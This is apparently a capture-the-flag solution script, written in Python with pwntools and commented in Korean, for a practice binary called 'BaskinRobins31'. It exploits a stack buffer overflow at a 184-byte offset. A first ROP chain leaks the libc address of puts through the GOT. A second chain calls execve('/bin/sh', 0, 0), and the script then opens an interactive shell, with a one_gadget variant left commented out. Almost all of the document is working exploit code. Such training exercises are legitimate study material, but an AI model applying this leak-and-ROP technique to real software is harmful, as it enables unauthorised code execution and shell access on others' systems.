#! -*- coding: utf-8 -*-
from pwn import * 

p = process("./BaskinRobins31")

# main 함수 스트립 살아있고, 64비트 바이너리. 
# xref read gdb 명령어로 취약부분 바로 찾을 수 있음. 
# 입력 스택  0x7fffffffe220 , 0x7fffffffe2d4 , 0xB4(180) 바이트 거리 . 
# 프로그램 내 루틴과는 무관하게 bof 발생. 
# rop 할 인자 만들라고 helper라는 함수도 만들어놓음. 
# 64비트에서 rop 레지스터 순서는 rdi->rsi->rcx->rdx 순. rax는 함수 콜 번호. 
# libc 주소 leak 하고 system("/bin/sh") 호출하는 식으로 진행하자.

bin_offset =  0x1b3e9a
system_offset = 0x4f440
puts_offset = 0x809c0
execve_offset = 0xe4e30

one_gadget = [0x4f2c5,0x4f322,0x10a38c]

puts_plt = 0x4006c0
puts_got = 0x602020


p_rdi = 0x0400bc3	#pop rdi ; ret
p_di_si_dx = 0x040087a	#pop rdi rsi rdx
main = 0x0400a4b

payload = "a"*184
payload +=  p64(p_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
# puts(got) -> main

p.sendline(payload)

p.recvuntil("Don't break the rules...:(")
p.recvline()
rcv = p.recv()
rcv = rcv+"\x00"*(8-len(rcv))
rcv = u64(rcv)
#log.info("addr : "+rcv)

libc = rcv-puts_offset
system = libc+system_offset
bin = libc+bin_offset 
execve = libc + execve_offset
one = libc + one_gadget[1]

log.info("addr : "+hex(rcv))

payload2 = "c"*184
payload2 += p64(p_di_si_dx) + p64(bin) + p64(0) + p64(0) + p64(execve)
#execve("/bin/sh",0,0) , rax = 0x3b
#system 함수를 통한 실행이 되지 않아 execve의 주소를 직접 가지고 왔다. 

#payload2 += p64(one)
#매직가젯을 이용한 풀이. 실행 후 한줄씩 가다보면 execve 호출 구간으로 이동함.  


pause()
p.sendline(payload2)



p.interactive()